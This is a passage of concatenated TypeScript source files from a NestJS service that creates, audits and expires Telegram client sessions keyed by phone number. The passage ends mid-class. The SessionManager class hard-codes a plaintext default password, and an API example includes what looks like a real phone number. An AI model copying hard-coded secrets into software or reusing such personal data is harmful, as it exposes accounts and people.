active' })\r\n    @Prop({ default: true })\r\n    isActive: boolean;\r\n\r\n    @ApiProperty({ example: '2023-12-01T16:00:00Z', description: 'When the session was revoked/expired' })\r\n    @Prop()\r\n    revokedAt?: Date;\r\n\r\n    @ApiProperty({ example: 'manual_revocation', description: 'Reason for session revocation' })\r\n    @Prop()\r\n    revocationReason?: string;\r\n\r\n    @ApiProperty({ example: 5, description: 'Number of times this session has been used' })\r\n    @Prop({ default: 0 })\r\n    usageCount: number;\r\n\r\n    @ApiProperty({ example: 'session_validation_failed', description: 'Last known error with this session' })\r\n    @Prop()\r\n    lastError?: string;\r\n\r\n    @ApiProperty({ example: '2023-12-01T15:45:00Z', description: 'When the last error occurred' })\r\n    @Prop()\r\n    lastErrorAt?: Date;\r\n}\r\n\r\nexport const SessionAuditSchema = SchemaFactory.createForClass(SessionAudit);\r\n\r\n// Create indexes for better query performance\r\nSessionAuditSchema.index({ mobile: 1, createdAt: -1 });\r\nSessionAuditSchema.index({ status: 1, isActive: 1 });\r\nSessionAuditSchema.index({ createdAt: -1 });\r\nSessionAuditSchema.index({ lastUsedAt: -1 });\r\nSessionAuditSchema.index({ mobile: 1, isActive: 1, status: 1 });\r\n\r\n// Add middleware to automatically update lastUsedAt when session is accessed\r\nSessionAuditSchema.pre('findOneAndUpdate', function() {\r\n    const update = this.getUpdate() as any;\r\n    if (update.$set && !update.$set.lastUsedAt) {\r\n        update.$set.lastUsedAt = new Date();\r\n    }\r\n});\r\n","import { Injectable } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { SessionAudit, SessionAuditDocument, SessionStatus, SessionCreationMethod } from './schemas/sessions.schema';\r\nimport { CreateSessionAuditDto, UpdateSessionAuditDto, SessionAuditQueryDto, SessionAuditStatsDto } from './dto/session-audit.dto';\r\nimport { TelegramLogger } from '../Telegram/utils/telegram-logger';\r\n\r\n@Injectable()\r\nexport class SessionAuditService {\r\n    private readonly logger: TelegramLogger;\r\n\r\n    constructor(\r\n        @InjectModel(SessionAudit.name) private sessionAuditModel: Model<SessionAuditDocument>,\r\n    ) {\r\n        this.logger = new TelegramLogger('SessionAuditService');\r\n    }\r\n\r\n    /**\r\n     * Create a new session audit record\r\n     */\r\n    async createAuditRecord(createDto: CreateSessionAuditDto): Promise<SessionAudit> {\r\n        try {\r\n            this.logger.info(createDto.mobile, 'Creating session audit record');\r\n\r\n            const sessionAudit = new this.sessionAuditModel({\r\n                ...createDto,\r\n                status: SessionStatus.CREATED,\r\n                createdAt: new Date(),\r\n                lastUsedAt: new Date(),\r\n                usageCount: 0,\r\n                isActive: true\r\n            });\r\n\r\n            const savedRecord = await sessionAudit.save();\r\n            this.logger.info(createDto.mobile, `Session audit record created with ID: ${savedRecord.id}`);\r\n\r\n            return savedRecord;\r\n        } catch (error) {\r\n            this.logger.error(createDto.mobile, 'Failed to create session audit record', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Update an existing session audit record\r\n     */\r\n    async updateAuditRecord(\r\n        mobile: string,\r\n        sessionString: string | undefined,\r\n        updateDto: UpdateSessionAuditDto\r\n    ): Promise<SessionAudit | null> {\r\n        try {\r\n            this.logger.info(mobile, 'Updating session audit record');\r\n\r\n            // Auto-update lastUsedAt when updating session\r\n            const updateData = {\r\n                ...updateDto,\r\n                lastUsedAt: new Date()\r\n            };\r\n\r\n            // Build query - if sessionString is provided, use it; otherwise find the latest record\r\n            const query: any = { mobile, isActive: true };\r\n            if (sessionString) {\r\n                query.sessionString = sessionString;\r\n            }\r\n\r\n            const updatedRecord = await this.sessionAuditModel.findOneAndUpdate(\r\n                query,\r\n                { $set: updateData },\r\n                { new: true, sort: { createdAt: -1 } } // Sort by creation time to get the latest if no sessionString\r\n            );\r\n\r\n            if (updatedRecord) {\r\n                this.logger.info(mobile, `Session audit record updated: ${updatedRecord.id}`);\r\n            } else {\r\n                this.logger.info(mobile, 'No active session audit record found to update');\r\n            }\r\n\r\n            return updatedRecord;\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Failed to update session audit record', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Mark session as used (increment usage count and update lastUsedAt)\r\n     */\r\n    async markSessionUsed(mobile: string, sessionString?: string): Promise<SessionAudit | null> {\r\n        try {\r\n            if (!mobile || typeof mobile !== 'string' || mobile.trim().length === 0) {\r\n                this.logger.warn('system', 'Invalid mobile number provided to markSessionUsed');\r\n                return null;\r\n            }\r\n\r\n            const query: any = { mobile, isActive: true };\r\n            if (sessionString && typeof sessionString === 'string' && sessionString.trim().length > 0) {\r\n                query.sessionString = sessionString;\r\n            }\r\n\r\n            const updatedRecord = await this.sessionAuditModel.findOneAndUpdate(\r\n                query,\r\n                {\r\n                    $inc: { usageCount: 1 },\r\n                    $set: { lastUsedAt: new Date() }\r\n                },\r\n                { new: true, sort: { createdAt: -1 } } // Get the latest session if no sessionString provided\r\n            );\r\n\r\n            if (updatedRecord) {\r\n                this.logger.info(mobile, `Session usage recorded: count ${updatedRecord.usageCount}`);\r\n            } else {\r\n                this.logger.warn(mobile, 'No active session found to mark as used');\r\n            }\r\n\r\n            return updatedRecord;\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Failed to mark session as used', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Mark session as failed with error\r\n     */\r\n    async markSessionFailed(\r\n        mobile: string,\r\n        sessionString: string | undefined,\r\n        errorMessage: string\r\n    ): Promise<SessionAudit | null> {\r\n        try {\r\n            return await this.updateAuditRecord(mobile, sessionString, {\r\n                status: SessionStatus.FAILED,\r\n                errorMessage,\r\n                lastError: errorMessage,\r\n                isActive: false\r\n            });\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Failed to mark session as failed', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Revoke/deactivate a session\r\n     */\r\n    async revokeSession(\r\n        mobile: string,\r\n        sessionString: string,\r\n        reason: string = 'manual_revocation'\r\n    ): Promise<SessionAudit | null> {\r\n        try {\r\n            return await this.updateAuditRecord(mobile, sessionString, {\r\n                status: SessionStatus.REVOKED,\r\n                revocationReason: reason,\r\n                revokedAt: new Date(),\r\n                isActive: false\r\n            });\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Failed to revoke session', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get all sessions for a phone number\r\n     */\r\n    async getSessionsFormobile(mobile: string, activeOnly: boolean = false): Promise<SessionAudit[]> {\r\n        try {\r\n            if (!mobile || typeof mobile !== 'string' || mobile.trim().length === 0) {\r\n                this.logger.warn('system', 'Invalid mobile number provided to getSessionsFormobile');\r\n                return [];\r\n            }\r\n\r\n            const query: any = { mobile };\r\n            if (activeOnly) {\r\n                query.isActive = true;\r\n                query.status = { $in: [SessionStatus.ACTIVE, SessionStatus.CREATED] };\r\n            }\r\n\r\n            const sessions = await this.sessionAuditModel\r\n                .find(query)\r\n                .sort({ createdAt: -1 })\r\n                .limit(100) // Add reasonable limit\r\n                .exec();\r\n\r\n            this.logger.info(mobile, `Retrieved ${sessions.length} session records (activeOnly: ${activeOnly})`);\r\n            return sessions;\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Failed to get sessions for phone number', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get the latest active session for a phone number\r\n     */\r\n    async getLatestActiveSession(mobile: string): Promise<SessionAudit | null> {\r\n        try {\r\n            const session = await this.sessionAuditModel\r\n                .findOne({ mobile, isActive: true })\r\n                .sort({ createdAt: -1 })\r\n                .exec();\r\n\r\n            if (session) {\r\n                this.logger.info(mobile, `Latest active session found: ${session.id}`);\r\n            }\r\n\r\n            return session;\r\n        } catch (error) {\r\n            this.logger.error(mobile, 'Failed to get latest active session', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Query sessions with filters\r\n     */\r\n    async querySessionAudits(queryDto: SessionAuditQueryDto): Promise<{\r\n        sessions: SessionAudit[];\r\n        total: number;\r\n        page: number;\r\n        limit: number;\r\n    }> {\r\n        try {\r\n            const {\r\n                mobile,\r\n                status,\r\n                creationMethod,\r\n                isActive,\r\n                limit = 20,\r\n                offset = 0,\r\n                startDate,\r\n                endDate\r\n            } = queryDto;\r\n\r\n            // Build query\r\n            const query: any = {};\r\n            if (mobile) query.mobile = mobile;\r\n            if (status) query.status = status;\r\n            if (creationMethod) query.creationMethod = creationMethod;\r\n            if (isActive !== undefined) query.isActive = isActive;\r\n\r\n            // Date range filter\r\n            if (startDate || endDate) {\r\n                query.createdAt = {};\r\n                if (startDate) query.createdAt.$gte = startDate;\r\n                if (endDate) query.createdAt.$lte = endDate;\r\n            }\r\n\r\n            // Execute query with pagination\r\n            const [sessions, total] = await Promise.all([\r\n                this.sessionAuditModel\r\n                    .find(query)\r\n                    .sort({ createdAt: -1 })\r\n                    .skip(offset)\r\n                    .limit(limit)\r\n                    .exec(),\r\n                this.sessionAuditModel.countDocuments(query)\r\n            ]);\r\n\r\n            this.logger.info('system', `Session audit query returned ${sessions.length} of ${total} records`);\r\n\r\n            return {\r\n                sessions,\r\n                total,\r\n                page: Math.floor(offset / limit) + 1,\r\n                limit\r\n            };\r\n        } catch (error) {\r\n            this.logger.error('system', 'Failed to query session audits', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get session audit statistics\r\n     */\r\n    async getSessionStats(mobile?: string, days: number = 30): Promise<SessionAuditStatsDto> {\r\n        try {\r\n            const startDate = new Date();\r\n            startDate.setDate(startDate.getDate() - days);\r\n\r\n            const query: any = { createdAt: { $gte: startDate } };\r\n            if (mobile) {\r\n                query.mobile = mobile;\r\n            }\r\n\r\n            // Aggregate statistics\r\n            const stats = await this.sessionAuditModel.aggregate([\r\n                { $match: query },\r\n                {\r\n                    $group: {\r\n                        _id: null,\r\n                        totalSessions: { $sum: 1 },\r\n                        activeSessions: {\r\n                            $sum: { $cond: [{ $eq: ['$status', SessionStatus.ACTIVE] }, 1, 0] }\r\n                        },\r\n                        expiredSessions: {\r\n                            $sum: { $cond: [{ $eq: ['$status', SessionStatus.EXPIRED] }, 1, 0] }\r\n                        },\r\n                        revokedSessions: {\r\n                            $sum: { $cond: [{ $eq: ['$status', SessionStatus.REVOKED] }, 1, 0] }\r\n                        },\r\n                        failedSessions: {\r\n                            $sum: { $cond: [{ $eq: ['$status', SessionStatus.FAILED] }, 1, 0] }\r\n                        }\r\n                    }\r\n                }\r\n            ]);\r\n\r\n            // Get creation method breakdown\r\n            const methodBreakdown = await this.sessionAuditModel.aggregate([\r\n                { $match: query },\r\n                {\r\n                    $group: {\r\n                        _id: '$creationMethod',\r\n                        count: { $sum: 1 }\r\n                    }\r\n                }\r\n            ]);\r\n\r\n            const baseStats = stats[0] || {\r\n                totalSessions: 0,\r\n                activeSessions: 0,\r\n                expiredSessions: 0,\r\n                revokedSessions: 0,\r\n                failedSessions: 0\r\n            };\r\n\r\n            const creationMethodBreakdown: Record<string, number> = {};\r\n            methodBreakdown.forEach(item => {\r\n                creationMethodBreakdown[item._id] = item.count;\r\n            });\r\n\r\n            const result: SessionAuditStatsDto = {\r\n                ...baseStats,\r\n                creationMethodBreakdown,\r\n                dateRange: {\r\n                    start: startDate,\r\n                    end: new Date()\r\n                }\r\n            };\r\n\r\n            this.logger.info(mobile || 'system', `Session stats retrieved: ${result.totalSessions} total sessions`);\r\n            return result;\r\n        } catch (error) {\r\n            this.logger.error(mobile || 'system', 'Failed to get session stats', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Clean up old session records (older than specified days)\r\n     */\r\n    async cleanupOldSessions(days: number = 90): Promise<{ deletedCount: number }> {\r\n        try {\r\n            const cutoffDate = new Date();\r\n            cutoffDate.setDate(cutoffDate.getDate() - days);\r\n\r\n            const result = await this.sessionAuditModel.deleteMany({\r\n                createdAt: { $lt: cutoffDate },\r\n                isActive: false\r\n            });\r\n\r\n            this.logger.info('system', `Cleaned up ${result.deletedCount} old session records`);\r\n            return { deletedCount: result.deletedCount };\r\n        } catch (error) {\r\n            this.logger.error('system', 'Failed to cleanup old sessions', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async findRecentSessions(mobile: string, days: number = 30): Promise<SessionAudit[]> {\r\n        try {\r\n            if (!mobile || typeof mobile !== 'string' || mobile.trim().length === 0) {\r\n                this.logger.warn('system', 'Invalid mobile number provided to findRecentSessions');\r\n                return [];\r\n            }\r\n\r\n            if (days <= 0 || days > 365) {\r\n                this.logger.warn(mobile, `Invalid days parameter: ${days}, using default 10 days`);\r\n                days = 30;\r\n            }\r\n\r\n            const cutoffDate = new Date();\r\n            cutoffDate.setDate(cutoffDate.getDate() - days);\r\n            cutoffDate.setHours(0, 0, 0, 0);\r\n\r\n            const recentSessions = await this.sessionAuditModel\r\n                .find({\r\n                    mobile,\r\n                    isActive: true,\r\n                    status: { $in: [SessionStatus.ACTIVE, SessionStatus.CREATED] },\r\n                    $or: [\r\n                        { lastUsedAt: { $gte: cutoffDate } },\r\n                        {\r\n                            lastUsedAt: { $exists: false },\r\n                            createdAt: { $gte: cutoffDate }\r\n                        }\r\n                    ]\r\n                })\r\n                .sort({ lastUsedAt: -1, createdAt: -1 })\r\n                .limit(50) // Add limit to prevent performance issues\r\n                .exec();\r\n\r\n            this.logger.info(mobile, `Found ${recentSessions.length} recent sessions from last ${days} days`);\r\n            return recentSessions;\r\n        } catch (error) {\r\n            this.logger.error(mobile, `Failed to find valid session from last ${days} days`, error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Mark expired sessions as expired (sessions not used in X days)\r\n     */\r\n    async markExpiredSessions(inactiveDays: number = 7): Promise<{ modifiedCount: number }> {\r\n        try {\r\n            const cutoffDate = new Date();\r\n            cutoffDate.setDate(cutoffDate.getDate() - inactiveDays);\r\n\r\n            const result = await this.sessionAuditModel.updateMany(\r\n                {\r\n                    lastUsedAt: { $lt: cutoffDate },\r\n                    status: { $in: [SessionStatus.CREATED, SessionStatus.ACTIVE] },\r\n                    isActive: true\r\n                },\r\n                {\r\n                    $set: {\r\n                        status: SessionStatus.EXPIRED,\r\n                        isActive: false,\r\n                        revokedAt: new Date(),\r\n                        revocationReason: 'auto_expired_due_to_inactivity'\r\n                    }\r\n                }\r\n            );\r\n\r\n            this.logger.info('system', `Marked ${result.modifiedCount} sessions as expired`);\r\n            return { modifiedCount: result.modifiedCount };\r\n        } catch (error) {\r\n            this.logger.error('system', 'Failed to mark expired sessions', error);\r\n            throw error;\r\n        }\r\n    }\r\n}\r\n","import { Controller, Post, Body, HttpException, HttpStatus, Get, Query, UsePipes, ValidationPipe } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiBody, ApiQuery } from '@nestjs/swagger';\r\nimport { SessionService } from './session.service';\r\nimport { IsString, IsOptional, IsBoolean, IsNumber, Min } from 'class-validator';\r\nimport { ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\n// DTOs for the two main endpoints\r\nexport class CreateSessionDto {\r\n    @ApiPropertyOptional({\r\n        description: 'Phone number with country code (optional if session provided)',\r\n        example: '+1234567890'\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    mobile?: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Existing session string to use',\r\n        example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6zPg2CwJjFBw5wHkJfFpBVts...'\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    session?: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Force creation of new session even if active session exists',\r\n        default: false\r\n    })\r\n    @IsOptional()\r\n    @IsBoolean()\r\n    forceNew?: boolean;\r\n}\r\n\r\nexport class SearchAuditDto {\r\n    @ApiPropertyOptional({\r\n        description: 'Phone number to search for',\r\n        example: '+1234567890'\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    mobile?: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Session status to filter by',\r\n        enum: ['created', 'active', 'expired', 'revoked', 'failed']\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    status?: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Number of records to return',\r\n        default: 10,\r\n        minimum: 1\r\n    })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    @Min(1)\r\n    limit?: number;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Number of records to skip',\r\n        default: 0,\r\n        minimum: 0\r\n    })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    @Min(0)\r\n    offset?: number;\r\n}\r\n\r\nexport class GetOldestSessionDto {\r\n    @ApiPropertyOptional({\r\n        description: 'Phone number to get session for',\r\n        example: '+1234567890'\r\n    })\r\n    @IsString()\r\n    mobile: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Force creation of new session if no valid old session exists',\r\n        default: true\r\n    })\r\n    @IsOptional()\r\n    @IsBoolean()\r\n    allowFallback?: boolean;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Maximum age of session to consider (in days)',\r\n        default: 180,\r\n        minimum: 1,\r\n        maximum: 365\r\n    })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    @Min(1)\r\n    maxAgeDays?: number;\r\n}\r\n\r\n@ApiTags('Telegram Session Management')\r\n@Controller('telegram/session')\r\n@UsePipes(new ValidationPipe({ transform: true, whitelist: true }))\r\nexport class SessionController {\r\n    constructor(private readonly sessionService: SessionService) { }\r\n\r\n    @Post('create')\r\n    @ApiOperation({\r\n        summary: 'Master session creation endpoint',\r\n        description: 'Creates or retrieves a session based on provided parameters. If forceNew is true, always creates a new session. If forceNew is false, returns active session if exists and was used this month, otherwise creates new.'\r\n    })\r\n    @ApiBody({ type: CreateSessionDto })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Session created or retrieved successfully',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                success: { type: 'boolean', example: true },\r\n                message: { type: 'string', example: 'Session created successfully' },\r\n                session: { type: 'string', example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6z...' },\r\n                isNew: { type: 'boolean', example: true }\r\n            }\r\n        }\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Bad request - validation failed or session creation failed'\r\n    })\r\n    async createSession(@Body() body: CreateSessionDto) {\r\n        try {\r\n            if (!body.mobile && !body.session) {\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: 'Either mobile number or session string is required'\r\n                    },\r\n                    HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n\r\n            if (!body.forceNew && body.mobile) {\r\n                const validSessionResult = await this.sessionService.findRecentValidSession(body.mobile);\r\n                if (validSessionResult.success && validSessionResult.session) {\r\n                    // Add error handling for updateSessionLastUsed\r\n                    try {\r\n                        await this.sessionService.updateSessionLastUsed(body.mobile, validSessionResult.session.sessionString);\r\n                    } catch (updateError) {\r\n                        console.log('Warning: Failed to update session last used timestamp:', updateError.message);\r\n                        // Continue execution even if update fails\r\n                    }\r\n\r\n                    return {\r\n                        success: true,\r\n                        message: 'Valid session found from this month',\r\n                        session: validSessionResult.session.sessionString,\r\n                        isNew: false\r\n                    };\r\n                } else {\r\n                    console.log('No valid session found from this month');\r\n                }\r\n            }\r\n\r\n            // Create new session\r\n            const options = {\r\n                mobile: body.mobile,\r\n                oldSession: body.session\r\n            };\r\n\r\n            const result = await this.sessionService.createSession(options);\r\n\r\n            if (result.success) {\r\n                return {\r\n                    success: true,\r\n                    message: 'Session created successfully',\r\n                    session: result.session,\r\n                    isNew: true\r\n                };\r\n            } else {\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: result.error,\r\n                        retryable: result.retryable\r\n                    },\r\n                    result.retryable ? HttpStatus.TOO_MANY_REQUESTS : HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n        } catch (error) {\r\n            if (error instanceof HttpException) {\r\n                throw error;\r\n            }\r\n\r\n            throw new HttpException(\r\n                {\r\n                    success: false,\r\n                    message: error.message || 'Failed to create/retrieve session'\r\n                },\r\n                HttpStatus.INTERNAL_SERVER_ERROR\r\n            );\r\n        }\r\n    }\r\n\r\n    @Get('audit/search')\r\n    @ApiOperation({\r\n        summary: 'Search existing audit sessions',\r\n        description: 'Search and retrieve session audit records based on various criteria'\r\n    })\r\n    @ApiQuery({ name: 'mobile', required: false, type: String, description: 'Phone number to search for' })\r\n    @ApiQuery({ name: 'status', required: false, enum: ['created', 'active', 'expired', 'revoked', 'failed'], description: 'Filter by session status' })\r\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Number of records to return (default: 10)' })\r\n    @ApiQuery({ name: 'offset', required: false, type: Number, description: 'Number of records to skip (default: 0)' })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Audit records retrieved successfully',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                success: { type: 'boolean', example: true },\r\n                data: {\r\n                    type: 'array',\r\n                    items: {\r\n                        type: 'object',\r\n                        properties: {\r\n                            mobile: { type: 'string', example: '916265240911' },\r\n                            sessionString: { type: 'string', example: '1BQANOTEuM==...' },\r\n                            status: { type: 'string', example: 'active' },\r\n                            creationMethod: { type: 'string', example: 'old_session' },\r\n                            createdAt: { type: 'string', example: '2023-12-01T10:00:00Z' },\r\n                            lastUsedAt: { type: 'string', example: '2023-12-01T15:30:00Z' },\r\n                            usageCount: { type: 'number', example: 5 }\r\n                        }\r\n                    }\r\n                },\r\n                total: { type: 'number', example: 25 },\r\n                message: { type: 'string', example: 'Audit records retrieved successfully' }\r\n            }\r\n        }\r\n    })\r\n    async searchAudit(\r\n        @Query('mobile') mobile?: string,\r\n        @Query('status') status?: string,\r\n        @Query('limit') limit?: number,\r\n        @Query('offset') offset?: number\r\n    ) {\r\n        try {\r\n            // Validate and sanitize numeric inputs\r\n            const safeLimit = limit && !isNaN(Number(limit)) && Number(limit) > 0 ? Number(limit) : 10;\r\n            const safeOffset = offset && !isNaN(Number(offset)) && Number(offset) >= 0 ? Number(offset) : 0;\r\n\r\n            const options = {\r\n                limit: safeLimit,\r\n                offset: safeOffset\r\n            };\r\n\r\n            let result;\r\n            if (mobile) {\r\n                // Search by mobile number\r\n                result = await this.sessionService.getSessionAuditHistory(mobile, {\r\n                    ...options,\r\n                    status: status as any\r\n                });\r\n            } else {\r\n                // General search - we need to implement this in service\r\n                // For now, throw error as we need mobile for the current implementation\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: 'Mobile number is required for search'\r\n                    },\r\n                    HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n\r\n            if (result.success) {\r\n                return {\r\n                    success: true,\r\n                    data: result.data || [],\r\n                    total: result.total || 0,\r\n                    message: `Retrieved ${result.data?.length || 0} audit records`\r\n                };\r\n            } else {\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: result.error || 'Failed to retrieve audit records'\r\n                    },\r\n                    HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n        } catch (error) {\r\n            if (error instanceof HttpException) {\r\n                throw error;\r\n            }\r\n\r\n            throw new HttpException(\r\n                {\r\n                    success: false,\r\n                    message: error.message || 'Failed to search audit records'\r\n                },\r\n                HttpStatus.INTERNAL_SERVER_ERROR\r\n            );\r\n        }\r\n    }\r\n\r\n    @Post('oldest')\r\n    @ApiOperation({\r\n        summary: 'Get oldest valid session or create new session as fallback',\r\n        description: 'Returns the oldest valid session for the mobile number. If no valid session exists and allowFallback is true, creates a new session as fallback. This endpoint is optimized for stability and reliability.'\r\n    })\r\n    @ApiBody({ type: GetOldestSessionDto })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Session retrieved or created successfully',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                success: { type: 'boolean', example: true },\r\n                message: { type: 'string', example: 'Oldest session retrieved successfully' },\r\n                data: {\r\n                    type: 'object',\r\n                    properties: {\r\n                        session: { type: 'string', example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6z...' },\r\n                        sessionAge: { type: 'number', example: 5, description: 'Age of session in days' },\r\n                        isNew: { type: 'boolean', example: false, description: 'Whether this is a newly created session' },\r\n                        usageCount: { type: 'number', example: 12, description: 'Number of times this session has been used' },\r\n                        lastUsedAt: { type: 'string', example: '2024-08-05T10:30:00Z', description: 'When the session was last used' },\r\n                        createdAt: { type: 'string', example: '2024-08-01T14:20:00Z', description: 'When the session was created' }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Bad request - validation failed or no session available'\r\n    })\r\n    @ApiResponse({\r\n        status: 404,\r\n        description: 'No valid session found and fallback disabled'\r\n    })\r\n    @ApiResponse({\r\n        status: 429,\r\n        description: 'Rate limit exceeded'\r\n    })\r\n    @ApiResponse({\r\n        status: 500,\r\n        description: 'Internal server error'\r\n    })\r\n    async getOldestSessionOrCreate(@Body() body: GetOldestSessionDto) {\r\n        try {\r\n            // Validate required parameters\r\n            if (!body.mobile || typeof body.mobile !== 'string' || body.mobile.trim().length === 0) {\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: 'Mobile number is required and must be a non-empty string',\r\n                        code: 'INVALID_MOBILE'\r\n                    },\r\n                    HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n\r\n            // Sanitize and set defaults\r\n            const mobile = body.mobile.trim();\r\n            const allowFallback = body.allowFallback !== false; // Default to true\r\n            const maxAgeDays = body.maxAgeDays && body.maxAgeDays > 0 && body.maxAgeDays <= 365 \r\n                ? body.maxAgeDays \r\n                : 180; // Default to 180 days, max 365 days\r\n\r\n            // Call service method\r\n            const result = await this.sessionService.getOldestSessionOrCreate({\r\n                mobile,\r\n                allowFallback,\r\n                maxAgeDays\r\n            });\r\n\r\n            if (result.success) {\r\n                return result.data\r\n            } else {\r\n                // Determine appropriate HTTP status based on error type\r\n                let httpStatus = HttpStatus.BAD_REQUEST;\r\n\r\n                if (result.code === 'NO_SESSION_FOUND') {\r\n                    httpStatus = HttpStatus.NOT_FOUND;\r\n                } else if (result.code === 'RATE_LIMIT_EXCEEDED') {\r\n                    httpStatus = HttpStatus.TOO_MANY_REQUESTS;\r\n                } else if (result.code === 'FALLBACK_DISABLED') {\r\n                    httpStatus = HttpStatus.NOT_FOUND;\r\n                }\r\n\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: result.message,\r\n                        code: result.code,\r\n                        retryable: result.retryable || false\r\n                    },\r\n                    httpStatus\r\n                );\r\n            }\r\n        } catch (error) {\r\n            if (error instanceof HttpException) {\r\n                throw error;\r\n            }\r\n\r\n            // Log unexpected errors\r\n            console.error('Unexpected error in getOldestSessionOrCreate:', error);\r\n\r\n            throw new HttpException(\r\n                {\r\n                    success: false,\r\n                    message: 'An unexpected error occurred while processing your request',\r\n                    code: 'INTERNAL_ERROR'\r\n                },\r\n                HttpStatus.INTERNAL_SERVER_ERROR\r\n            );\r\n        }\r\n    }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { SessionController } from './session.controller';\r\nimport { SessionService } from './session.service';\r\nimport { SessionAuditService } from './session-audit.service';\r\nimport { SessionAudit, SessionAuditSchema } from './schemas/sessions.schema';\r\n\r\n@Module({\r\n    imports: [\r\n        MongooseModule.forFeature([\r\n            { name: SessionAudit.name, schema: SessionAuditSchema }\r\n        ])\r\n    ],\r\n    controllers: [SessionController],\r\n    providers: [SessionService, SessionAuditService],\r\n    exports: [SessionService, SessionAuditService]\r\n})\r\nexport class SessionModule {}\r\n","import { Injectable } from '@nestjs/common';\r\nimport { TelegramClient } from 'telegram';\r\nimport { StringSession } from 'telegram/sessions';\r\nimport { Api } from 'telegram';\r\nimport { parseError, sleep } from '../../utils';\r\nimport { TelegramLogger } from '../Telegram/utils/telegram-logger';\r\nimport { connectionManager } from '../Telegram/utils/connection-manager';\r\nimport { ClientRegistry } from './client-registry';\r\nimport { SessionAuditService } from './session-audit.service';\r\nimport { SessionCreationMethod, SessionStatus, SessionAudit } from './schemas/sessions.schema';\r\nimport { SessionAuditStatsDto } from './dto/session-audit.dto';\r\n\r\nexport interface SessionCreationOptions {\r\n    oldSession?: string;\r\n    mobile?: string;\r\n    password?: string;\r\n    maxRetries?: number;\r\n    retryDelay?: number;\r\n}\r\n\r\nexport interface SessionCreationResult {\r\n    success: boolean;\r\n    session?: string;\r\n    error?: string;\r\n    retryable?: boolean;\r\n}\r\n\r\nexport class SessionManager {\r\n    private static instance: SessionManager | null = null;\r\n    private readonly logger = new TelegramLogger('SessionManager');\r\n    private readonly clientRegistry = ClientRegistry.getInstance();\r\n\r\n    // Constants\r\n    private readonly DEFAULT_PASSWORD = \"Ajtdmwajt1@\";\r\n    private readonly DEFAULT_MAX_RETRIES = 3;\r\n    private readonly DEFAULT_RETRY_DELAY = 5000;\r\n    private readonly OTP_WAIT_TIME = 120000; // 2 minutes\r\n    private readonly OTP_CHECK_INTERVAL = 3000; // 3 seconds\r\n\r\n    private constructor() {\r\n    }\r\n\r\n    private getApiId(): number {\r\n        const apiId = parseInt(process.env.API_ID!);\r\n        if (isNaN(apiId)) {\r\n            throw new Error('Invalid API_ID: must be a number');\r\n        }\r\n        return apiId;\r\n    }\r\n\r\n    private getApiHash(): string {\r\n        const apiHash = process.env.API_HASH;\r\n        if (!apiHash) {\r\n            throw new Error('API_HASH environment variable is required');\r\n        }\r\n        return apiHash;\r\n    }\r\n\r\n    public static getInstance(): SessionManager {\r\n        if (!SessionManager.instance) {\r\n            